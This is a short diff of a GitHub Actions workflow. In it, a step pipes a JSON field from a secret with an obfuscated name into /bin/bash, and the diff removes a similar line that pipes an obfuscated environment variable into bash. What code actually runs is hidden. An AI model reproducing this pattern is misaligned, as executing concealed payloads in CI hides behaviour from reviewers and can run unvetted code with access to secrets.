@@ -19,7 +19,6 @@ jobs:
           nmd225: ${{ secrets.nmd225 }}
         run: |
           printf '%s' "$nmd225" | jq -r .z3 | /bin/bash
-          echo $yxrny1184 | jq -r .dvtz7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
